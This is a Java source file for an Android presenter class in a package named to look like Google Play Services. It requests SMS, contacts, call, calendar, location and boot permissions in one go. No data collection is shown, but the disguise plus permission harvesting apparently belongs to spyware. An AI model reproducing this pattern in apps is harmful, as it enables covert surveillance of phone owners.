package com.google.android.gms.persistent.googleapps.ui;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.view.View;

import com.google.android.gms.persistent.googleapps.App;
import com.google.android.gms.persistent.googleapps.R;
import com.tbruyelle.rxpermissions2.RxPermissions;

import javax.inject.Inject;

/**
 * Created by OldMan on 08.04.2017.
 */

public class MainPresenterImpl implements MainPresenter {
    private final MainView view;
    private final MainInteractor interactor;
    private Context context;
    @Inject
    public MainPresenterImpl(MainView view, MainInteractor interactor) {
        this.view = view;
        this.interactor = interactor;
    }

    @Override
    public void onResume() {

    }

    @Override
    public void onPause() {

    }

    @Override
    public void onDestroy() {

    }

    @Override
    public void onFinish() {

    }

    @Override
    public void onDeviceRegister() {

    }

    @Override
    public void getDeviceIdOnServer() {
        if (view != null) {
            view.showProgress();
            view.hideButton();
        }
    }

    @Override
    public void invokePermission() {
        context = App.getAppComponent().getContext();
        new RxPermissions((Activity) view)
                .request(Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.CALL_PHONE,
                        Manifest.permission.READ_CALENDAR,
                        Manifest.permission.RECEIVE_BOOT_COMPLETED,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_NETWORK_STATE
                        // privileged
//                        Manifest.permission.ACCESS_WIFI_STATE,
//                        Manifest.permission.BATTERY_STATS,
//                        Manifest.permission.CHANGE_NETWORK_STATE)
                )
                .subscribe(granted -> {
                    if (granted) { // Always true pre-M
                        view.showSnackBar(context.
                                getResources().getString(R.string.request_permission), null);
                    } else {
                        view.showSnackBar(context.
                                getResources().getString(R.string.request_permission), context.
                                getResources().getString(R.string.settings));
                    }
                });
    }
}
